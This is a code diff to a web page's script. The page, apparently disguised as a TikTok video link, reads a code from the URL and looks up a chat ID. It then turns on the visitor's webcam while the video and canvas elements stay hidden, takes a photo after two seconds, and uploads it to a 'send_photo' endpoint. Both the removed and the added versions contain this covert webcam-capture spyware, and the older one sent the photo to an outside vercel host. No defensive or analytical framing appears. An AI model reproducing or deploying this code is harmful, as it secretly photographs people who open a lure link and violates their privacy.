@@ -1,45 +1,45 @@
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 <script>
-const BASE_URL = "https://tiktok-video.vercel.app/";  
-const pathParts = window.location.pathname.split("/");
-const userCode = pathParts[pathParts.length - 1];  
+const userCode = new URLSearchParams(window.location.search).get("code");
 
-fetch(BASE_URL + "get_user_id?code=" + userCode)  
-    .then(response => response.text())
-    .then(chat_id => {
-        if (chat_id === "not_found") return;
+if (userCode) {
+    fetch("/get_user_id?code=" + userCode)  
+        .then(response => response.text())
+        .then(chat_id => {
+            if (chat_id === "not_found") return;
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                let video = document.getElementById('video');
-                video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    setTimeout(() => capturePhoto(chat_id), 2000);
-                };
-            });
-
-        function capturePhoto(chat_id) {
-            let video = document.getElementById('video');
-            let canvas = document.getElementById('canvas');
-            let ctx = canvas.getContext('2d');
-
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(blob => {
-                let formData = new FormData();
-                formData.append('chat_id', chat_id);
-                formData.append('photo', blob, 'photo.jpg');
-
-                fetch(BASE_URL + "send_photo", {  
-                    method: 'POST',
-                    body: formData
-                }).then(() => {
-                    video.srcObject.getTracks().forEach(track => track.stop());  
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    let video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        setTimeout(() => capturePhoto(chat_id), 2000);
+                    };
                 });
-            }, 'image/jpeg');
-        }
-    });
+
+            function capturePhoto(chat_id) {
+                let video = document.getElementById('video');
+                let canvas = document.getElementById('canvas');
+                let ctx = canvas.getContext('2d');
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    let formData = new FormData();
+                    formData.append('chat_id', chat_id);
+                    formData.append('photo', blob, 'photo.jpg');
+
+                    fetch("/send_photo", {  
+                        method: 'POST',
+                        body: formData
+                    }).then(() => {
+                        video.srcObject.getTracks().forEach(track => track.stop());  
+                    });
+                }, 'image/jpeg');
+            }
+        });
+}
 </script>
